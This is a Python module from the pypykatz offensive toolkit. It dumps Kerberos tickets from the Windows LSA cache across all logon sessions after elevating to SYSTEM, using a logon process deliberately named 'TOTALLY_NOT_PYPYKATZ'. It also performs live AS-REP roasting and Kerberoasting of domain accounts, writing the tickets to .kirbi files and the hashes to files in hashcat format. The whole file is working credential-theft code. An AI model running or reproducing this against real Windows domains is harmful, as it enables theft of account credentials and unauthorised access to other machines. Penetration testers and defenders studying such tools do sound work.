
import datetime
from msldap.commons.url import MSLDAPURLDecoder
from winsspi.sspi import KerberoastSSPI
from minikerberos.common.utils import TGSTicket2hashcat, TGTTicket2hashcat
from minikerberos.security import APREPRoast
from minikerberos.network.clientsocket import KerberosClientSocket
from minikerberos.common.target import KerberosTarget
from winsspi.sspi import KerberoastSSPI
from winacl.functions.highlevel import get_logon_info


from minikerberos.security import KerberosUserEnum, APREPRoast, Kerberoast
from msldap.authentication.kerberos.gssapi import get_gssapi, GSSWrapToken, KRB5_MECH_INDEP_TOKEN
from minikerberos.common.url import KerberosClientURL, kerberos_url_help_epilog
from minikerberos.common.spn import KerberosSPN
from minikerberos.common.creds import KerberosCredential
from minikerberos.common.target import KerberosTarget
from minikerberos.common.keytab import Keytab
from minikerberos.aioclient import AIOKerberosClient
from minikerberos.common.utils import TGSTicket2hashcat
from minikerberos.protocol.asn1_structs import AP_REQ, TGS_REQ, KRB_CRED
from minikerberos.common.utils import print_table
from minikerberos.common.ccache import CCACHE, Credential
from minikerberos.protocol.asn1_structs import KRBCRED


from pypykatz import logger
from pypykatz.commons.winapi.processmanipulator import ProcessManipulator
from pypykatz.kerberos.functiondefs.netsecapi import LsaConnectUntrusted, \
	LsaLookupAuthenticationPackage, KERB_PURGE_TKT_CACHE_REQUEST, LsaCallAuthenticationPackage, \
	LsaDeregisterLogonProcess, LsaRegisterLogonProcess, LsaEnumerateLogonSessions, \
	LsaGetLogonSessionData, LsaFreeReturnBuffer, retrieve_tkt_helper, KERB_RETRIEVE_TKT_RESPONSE, \
	get_lsa_error, get_ticket_cache_info_helper, extract_ticket

from pypykatz.kerberos.functiondefs.advapi32 import OpenProcessToken,  GetTokenInformation_tokenstatistics
from pypykatz.kerberos.functiondefs.kernel32 import GetCurrentProcessId, OpenProcess, CloseHandle, MAXIMUM_ALLOWED

from minikerberos.protocol.encryption import Key, _enctype_table

class KerberosLive:
	def __init__(self, start_luid = 0):
		self.available_luids = []
		self.current_luid = start_luid
		self.original_luid = self.get_current_luid()
		self.kerberos_package_id = None
		self.__lsa_handle = None
		self.__lsa_handle_is_elevated = None
		
		self.get_kerberos_package_id()
		self.list_luids()

	def get_kerberos_package_id(self):
		if self.kerberos_package_id is None:
			lsa_handle = LsaConnectUntrusted()
			self.kerberos_package_id = LsaLookupAuthenticationPackage(lsa_handle, 'kerberos')
			LsaDeregisterLogonProcess(lsa_handle)

		return self.kerberos_package_id

	def __open_elevated(self):
		if self.__lsa_handle_is_elevated is True:
			return self.__lsa_handle
		
		pm = ProcessManipulator()
		pm.getsystem()
		self.__lsa_handle = LsaRegisterLogonProcess('TOTALLY_NOT_PYPYKATZ')
		pm.dropsystem()
		print('1')
		self.__lsa_handle_is_elevated = True
		return self.__lsa_handle

	def open_lsa_handle(self, luid, req_elevated = False):
		print('luid %s' % luid)
		print('elev %s' % req_elevated)
		if req_elevated is True:
			if self.__lsa_handle_is_elevated is True:
				return self.__lsa_handle
			return self.__open_elevated()

		
		if self.current_luid == 0 or self.original_luid == self.current_luid:
			self.__lsa_handle = LsaConnectUntrusted()
			self.__lsa_handle_is_elevated = False
		else:
			self.__open_elevated()

		return self.__lsa_handle
	
	def switch_luid(self, new_luid):
		self.open_lsa_handle(0, req_elevated=True)
		if new_luid not in self.available_luids:
			if new_luid not in self.list_luids():
				raise Exception('This luid is not known!')

		self.current_luid = new_luid

	def get_ticket_from_cache(self, luid, targetname):
		self.open_lsa_handle(0, req_elevated=True)
		ticket_data = None
		msg_req_ticket = retrieve_tkt_helper(targetname, logonid = luid)
		ret_msg, ret_status, free_prt = LsaCallAuthenticationPackage(self.__lsa_handle, self.kerberos_package_id, msg_req_ticket)
		
		#print('ret_msg %s' % ret_msg)
		#print('ret_status %s' % ret_status)
		if ret_status != 0:
			raise get_lsa_error(ret_status)
		
		if len(ret_msg) > 0:
			resp = KERB_RETRIEVE_TKT_RESPONSE.from_buffer_copy(ret_msg)
			ticket_data = resp.Ticket.get_data()
			LsaFreeReturnBuffer(free_prt)

		return ticket_data

	def get_ticketinfo(self, luid):
		self.open_lsa_handle(luid)
		ticket_infos = {}
		ticket_infos[luid] = []
		for ticket_info in get_ticket_cache_info_helper(self.__lsa_handle, self.kerberos_package_id, luid, throw = False):
			ticket_infos[luid].append(ticket_info)

		return ticket_infos

	def get_all_ticketinfo(self):
		self.open_lsa_handle(0, req_elevated=True)
		ticket_infos = {}
		for luid in self.list_luids():
			if luid not in ticket_infos:
				ticket_infos[luid] = []
			for ticket_info in get_ticket_cache_info_helper(self.__lsa_handle, self.kerberos_package_id, luid, throw = False):
				if ticket_info != []:
					ticket_infos[luid].append(ticket_info)

		return ticket_infos

	def get_all_ticketdata(self):
		self.open_lsa_handle(0, req_elevated=True)
		ticket_infos = self.get_all_ticketinfo()
		ticket_data = {}
		for luid in ticket_infos:
			if luid not in ticket_data:
				ticket_data[luid] = []
			print(ticket_data)
			for ticket in ticket_infos[luid]:
				res = extract_ticket(self.__lsa_handle, self.kerberos_package_id, luid, ticket['ServerName'])
				ticket_data[luid].append(res)
		return ticket_data

	def get_current_luid(self):
		current_pid = GetCurrentProcessId()
		process_handle = OpenProcess(MAXIMUM_ALLOWED, False, current_pid)
		token_handle = OpenProcessToken(process_handle)
		stats = GetTokenInformation_tokenstatistics(token_handle)
		CloseHandle(process_handle)
		return stats['TokenId']

	def list_luids(self):
		self.available_luids = LsaEnumerateLogonSessions()
		return self.available_luids

	def list_sessions(self):
		for luid in self.available_luids:
			try:
				session_info = LsaGetLogonSessionData(luid)
				print('USER "%s\\%s" SPN "%s" LUID %s' % (session_info.get('LogonDomain', '.'), session_info['UserName'], session_info['Upn'], hex(session_info['LogonId'])))
			except Exception as e:
				logger.debug('Failed to get info for LUID %s Reason: %s' % (luid, e ))
				continue

	def purge(self, luid):
		self.open_lsa_handle(luid)
		message = KERB_PURGE_TKT_CACHE_REQUEST()
		message_ret, status_ret, free_ptr = LsaCallAuthenticationPackage(self.__lsa_handle, self.kerberos_package_id, message)
		LsaFreeReturnBuffer(free_ptr)


async def live_roast(outfile = None):
	try:
		logon = get_logon_info()
		domain = logon['domain']
		url = 'ldap+sspi-ntlm://%s' % logon['logonserver']
		msldap_url = MSLDAPURLDecoder(url)
		client = msldap_url.get_client()
		_, err = await client.connect()
		if err is not None:
			raise err

		domain = client._ldapinfo.distinguishedName.replace('DC=','').replace(',','.')
		spn_users = []
		asrep_users = []
		errors = []
		results = []
		final_results = []
		spn_cnt = 0
		asrep_cnt = 0
		async for user, err in client.get_all_knoreq_users():
			if err is not None:
				raise err
			cred = KerberosCredential()
			cred.username = user.sAMAccountName
			cred.domain = domain
			
			asrep_users.append(cred)
		async for user, err in client.get_all_service_users():
			if err is not None:
				raise err
			cred = KerberosCredential()
			cred.username = user.sAMAccountName
			cred.domain = domain
			
			spn_users.append(cred)
			
		for cred in asrep_users:
			results = []
			ks = KerberosTarget(domain)
			ar = APREPRoast(ks)
			res = await ar.run(cred, override_etype = [23])
			results.append(res)	
		
		if outfile is not None:
			filename = outfile + 'asreproast_%s_%s.txt' % (logon['domain'], datetime.datetime.utcnow().strftime("%Y%m%d_%H%M%S"))
			with open(filename, 'w', newline = '') as f:
					for thash in results:
						asrep_cnt += 1
						f.write(thash + '\r\n')
		else:
			final_results += results

		results = []
		for cred in spn_users:
			spn_name = '%s@%s' % (cred.username, cred.domain)
			if spn_name[:6] == 'krbtgt':
				continue
			ksspi = KerberoastSSPI()
			try:
				ticket = ksspi.get_ticket_for_spn(spn_name)
			except Exception as e:
				errors.append((spn_name, e))
				continue
			results.append(TGSTicket2hashcat(ticket))
		
		if outfile is not None:
			filename = outfile+ 'spnroast_%s_%s.txt' % (logon['domain'], datetime.datetime.utcnow().strftime("%Y%m%d_%H%M%S"))
			with open(filename, 'w', newline = '') as f:
				for thash in results:
					spn_cnt += 1
					f.write(thash + '\r\n')
		
		else:
			final_results += results

		return final_results, errors, None

	except Exception as e:
		return None, None, e


if __name__ == '__main__':
	kl = KerberosLive()
	x = kl.get_all_ticketdata()
	ctr = 0
	for luid in x:
		if x[luid] != []:
			for ticket in x[luid]:
				ctr += 1
				with open('test_%s.kirbi' % ctr, 'wb') as f:
					f.write(ticket['Ticket'])

	#print(x)